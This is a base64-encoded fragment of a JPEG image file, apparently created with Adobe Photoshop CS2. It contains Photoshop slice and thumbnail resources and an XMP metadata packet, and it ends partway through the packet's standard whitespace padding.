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ICAgICAgPGRjOmZvcm1hdD5pbWFnZS9qcGVnPC9kYzpmb3JtYXQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4YXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPgogICAgICAgICA8eGFwOkNyZWF0b3JUb29sPkFkb2JlIFBob3Rvc2hvcCBDUzIgV2luZG93czwveGFwOkNyZWF0b3JUb29sPgogICAgICAgICA8eGFwOkNyZWF0ZURhdGU+MjAwOS0xMS0zMFQxMToxODoyMiswMTowMDwveGFwOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4YXA6TW9kaWZ5RGF0ZT4yMDA5LTExLTMwVDExOjE4OjIyKzAxOjAwPC94YXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhhcDpNZXRhZGF0YURhdGU+MjAwOS0xMS0zMFQxMToxODoyMiswMTowMDwveGFwOk1ldGFkYXRhRGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhhcE1NPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvbW0vIgogICAgICAgICAgICB4bWxuczpzdFJlZj0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL3NUeXBlL1Jlc291cmNlUmVmIyI+CiAgICAgICAgIDx4YXBNTTpEb2N1bWVudElEPnV1aWQ6NjRFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3hhcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4YXBNTTpJbnN0YW5jZUlEPnV1aWQ6NjVFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3hhcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4YXBNTTpEZXJpdmVkRnJvbSByZGY6cGFyc2VUeXBlPSJSZXNvdXJjZSI+CiAgICAgICAgICAgIDxzdFJlZjppbnN0YW5jZUlEPnV1aWQ6NjJFMTlGOEY5OEREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3N0UmVmOmluc3RhbmNlSUQ+CiAgICAgICAgICAgIDxzdFJlZjpkb2N1bWVudElEPnV1aWQ6MDcwREFGQTU4RUREREUxMUFGQTlFMzg4QzlGRUVDNEY8L3N0UmVmOmRvY3VtZW50SUQ+CiAgICAgICAgIDwveGFwTU06RGVyaXZlZEZyb20+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjMwMDAwMDAvMTAwMDA8L3RpZmY6WFJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOllSZXNvbHV0aW9uPjMwMDAwMDAvMTAwMDA8L3RpZmY6WVJlc29sdXRpb24+CiAgICAgICAgIDx0aWZmOlJlc29sdXRpb25Vbml0PjI8L3RpZmY6UmVzb2x1dGlvblVuaXQ+CiAgICAgICAgIDx0aWZmOk5hdGl2ZURpZ2VzdD4yNTYsMjU3LDI1OCwyNTksMjYyLDI3NCwyNzcsMjg0LDUzMCw1MzEsMjgyLDI4MywyOTYsMzAxLDMxOCwzMTksNTI5LDUzMiwzMDYsMjcwLDI3MSwyNzIsMzA1LDMxNSwzMzQzMjtFQTEwNzhBQjBCQkY2ODM0OTU4RTQyNTEwNzg5NjQ0QTwvdGlmZjpOYXRpdmVEaWdlc3Q+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczpleGlmPSJodHRwOi8vbnMuYWRvYmUuY29tL2V4aWYvMS4wLyI+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4xMDAwPC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjgwMDwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOkNvbG9yU3BhY2U+MTwvZXhpZjpDb2xvclNwYWNlPgogICAgICAgICA8ZXhpZjpOYXRpdmVEaWdlc3Q+MzY4NjQsNDA5NjAsNDA5NjEsMzcxMjEsMzcxMjIsNDA5NjIsNDA5NjMsMzc1MTAsNDA5NjQsMzY4NjcsMzY4NjgsMzM0MzQsMzM0MzcsMzQ4NTAsMzQ4NTIsMzQ4NTUsMzQ4NTYsMzczNzcsMzczNzgsMzczNzksMzczODAsMzczODEsMzczODIsMzczODMsMzczODQsMzczODUsMzczODYsMzczOTYsNDE0ODMsNDE0ODQsNDE0ODYsNDE0ODcsNDE0ODgsNDE0OTIsNDE0OTMsNDE0OTUsNDE3MjgsNDE3MjksNDE3MzAsNDE5ODUsNDE5ODYsNDE5ODcsNDE5ODgsNDE5ODksNDE5OTAsNDE5OTEsNDE5OTIsNDE5OTMsNDE5OTQsNDE5OTUsNDE5OTYsNDIwMTYsMCwyLDQsNSw2LDcsOCw5LDEwLDExLDEyLDEzLDE0LDE1LDE2LDE3LDE4LDIwLDIyLDIzLDI0LDI1LDI2LDI3LDI4LDMwOzBDQUM1NzI5RTc0MzNFRDc4RjVDNTdENTc5RTkwQ0Q0PC9leGlmOk5hdGl2ZURpZ2VzdD4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyI+CiAgICAgICAgIDxwaG90b3Nob3A6Q29sb3JNb2RlPjM8L3Bob3Rvc2hvcDpDb2xvck1vZGU+CiAgICAgICAgIDxwaG90b3Nob3A6SUNDUHJvZmlsZT5zUkdCIElFQzYxOTY2LTIuMTwvcGhvdG9zaG9wOklDQ1Byb2ZpbGU+CiAgICAgICAgIDxwaG90b3Nob3A6SGlzdG9yeS8+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgI